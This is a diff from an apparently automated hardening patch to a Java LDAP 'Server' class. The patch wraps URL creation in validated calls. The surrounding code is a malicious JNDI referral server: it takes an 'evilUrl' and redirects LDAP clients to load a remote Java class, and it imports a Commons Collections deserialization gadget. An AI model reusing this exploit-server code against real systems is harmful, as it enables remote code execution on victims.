@@ -7,6 +7,8 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import io.github.pixee.security.HostValidator;
+import io.github.pixee.security.Urls;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -61,7 +63,7 @@ public  class  Server  {
             (SSLSocketFactory) SSLSocketFactory.getDefault()
         ));
 
-        config.addInMemoryOperationInterceptor(new OperationInterceptor( new URL(evilUrl)));
+        config.addInMemoryOperationInterceptor(new OperationInterceptor( Urls.create(evilUrl, Urls.HTTP_PROTOCOLS, HostValidator.DENY_COMMON_INFRASTRUCTURE_TARGETS)));
         InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
         System.out.println( "LDAP server listening on 0.0.0.0:" + port);
         ds.startListening();
@@ -159,9 +161,7 @@ public  class  Server  {
                 result.sendSearchEntry(e);
                 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
             } else {
-               URL turl = new URL(
-                       this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")
-               );
+               URL turl = Urls.create(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"), Urls.HTTP_PROTOCOLS, HostValidator.DENY_COMMON_INFRASTRUCTURE_TARGETS);
                System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
